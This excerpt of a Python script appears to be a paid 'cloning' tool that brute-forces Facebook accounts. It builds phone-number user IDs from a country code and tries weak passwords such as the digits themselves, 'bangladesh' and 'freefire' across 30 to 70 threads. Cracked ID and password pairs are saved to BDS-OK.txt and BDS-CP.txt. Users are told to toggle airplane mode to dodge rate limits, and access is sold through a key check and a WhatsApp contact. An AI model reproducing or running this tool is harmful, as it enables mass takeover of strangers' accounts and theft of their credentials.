...
def BDS_RANDOM():
	print(logo)
	print('\033[1;37m[1] RANDOM PAK CLONING')
	print('\033[1;37m[2] RANDOM\033[38;5;46m BANGLADESH \033[1;37mCLONING')
	print('\033[1;37m[3] RANDOM CHOICE PASS CLONING')
	print('\033[1;37m[4] CONTACT WITH OWNER')
...
def menu():
	os.system('clear')
	print(logo)
	print('\033[1;37m[1] LAST 7 DIGIT')
	print('\033[1;37m[2] ALI + KHAN PASS')
	print('\033[1;37m[3] MALIK + BALOCH PASS')
	print('\033[1;37m[4] BEST FOR PUBG IDS')
	print('\033[1;37m[5] BEST FOR FREE FIRE IDS')
	print('\033[1;31m[0] EXIT TO MAIN MENU')
	lines()
	opt = input('[•] CHOOSE: ')
	if opt =='1':
		svn_digit()
...
def svn_digit():
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('\033[1;37m[•] TOTAL ACCOUNTS    : \033[38;5;46m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[38;5;46m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[38;5;46mLAST 7 DIGIT')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;34mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru]
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('\033[1;37m[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'bangladesh','freefire','FreeFire','Bangladesh','Bangla','Free Fire','free fire','i love you']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def pubg():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('[•] TOTAL ACCOUNTS    : \033[38;5;46m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[38;5;46m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[38;5;46mPUBG')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def ff():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[38;5;46m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[38;5;46m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[38;5;46mFREE FIRE')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def bd():
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('\033[1;37m[•] TOTAL ACCOUNTS    : \033[38;5;46m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[38;5;46m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[38;5;46mBANGLADESH')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;34mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
		     uid = kode+guru
		     pwx = [guru,'+88','bangladesh','freefire','FreeFire','Bangladesh','Bangla','Free Fire','free fire','i love you']
		     yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[38;5;46m[BDS-OK] '+cid+' | '+ps+'\x1b[1;97m')
                open('BDS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[BDS-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('BDS-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mBDS-7\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/D4rk-B0y/Api/blob/main/Approval.txt').text
    if id in httpCaht:
      print("\33[38;5;46mYOUR KEY IS APPROVED.")
      msg = str(os.geteuid())
      time.sleep(0.5)
      BDS_RANDOM()
      pass
      ...
      print('\33[1;37m----------------------------------------------')
      print("[•] \33[1;31mNOTE:")
      print("\033[38;5;46mTOOL IS PAID BUT YOU HAVE TO\nGET PAYMENT FIRST.")
      print('\33[1;37m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801863517912?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
